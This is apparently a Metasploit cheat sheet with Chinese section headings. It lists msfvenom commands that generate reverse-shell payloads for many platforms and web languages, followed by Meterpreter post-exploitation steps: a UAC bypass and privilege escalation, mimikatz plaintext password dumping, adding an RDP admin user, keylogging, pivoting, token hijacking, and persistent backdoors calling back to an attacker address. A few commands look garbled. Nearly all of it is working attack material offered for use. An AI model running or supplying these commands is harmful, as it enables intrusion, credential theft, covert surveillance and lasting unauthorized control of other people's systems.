######生成payload#######
######Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
#######Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
#######Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
Web Payloads
#######PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
#######ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
#######JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
######WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
Scripting Payloads
######Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
#######Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
#####Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
#######Shellcode
For all shellcode see ‘msfvenom Chelp-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
#######Linux Based Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
#######Windows Based Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
######Mac Based Shellcode
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
#####Handlers
Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.





######绕过UAC提权######
use exploit/windows/local/bypassuac_eventvwr
show options
set session
run
getuid
getsystem
######迁移进程######
get pid
######绑定进程######
migrate pid
######显示明文密码######
load mimikatz
wdigest
######开启远程桌面######
run post/windows/manage/enable_rdp开启远程桌面
run post/windows/manage/enable_rdp username=test password=test添加远程桌面的用户(同时也会将该用户添加到管理员组)
#######键盘记录########
keyscan_start：开启键盘记录功能
keyscan_dump：显示捕捉到的键盘记录信息
keyscan_stop：停止键盘记录功能
#######执行程序########
execute -h 查看使用方法
-H：创建一个隐藏进程
-a：传递给命令的参数
-i：跟进程进行交互
-m：从内存中执行
-t：使用当前伪造的线程令牌运行进程
-s：在给定会话中执行进程
例：execute -f c:/temp/hello.exe
#######端口转发和内网代理########
portfwd add -l 2222 -r 10.1.13 -p 3389
portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20

#############################
######获取目标内网相关信息
run get_local_subnets               
####获取被攻击目标内网地址网段
run autoroute -s 192.168.1.0/24
####扫描有效网卡的整个C段的信息
run autoroute -p                  
####查看域环境
use incognito                     
####调用劫持域管理模块
list_tokens -u                     
####查看当前目标主机的域环境信息
##添加去往目标网段的转发路由
run autoroute Cs <目标内网地址网段>
####查看路由添加情况
run autoroute -p
#########后门###########
 使用run metsvc -h查看帮助，一共有三个参数。
-A：安装后门后，自动启动exploit/multi/handler模块连接后门
-h：查看帮助
-r：删除后门
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set rhost ip
set lport 31337
run
############
run persistence -X -i 10 -r 192.168.1.9 -p 4444
#########################
run












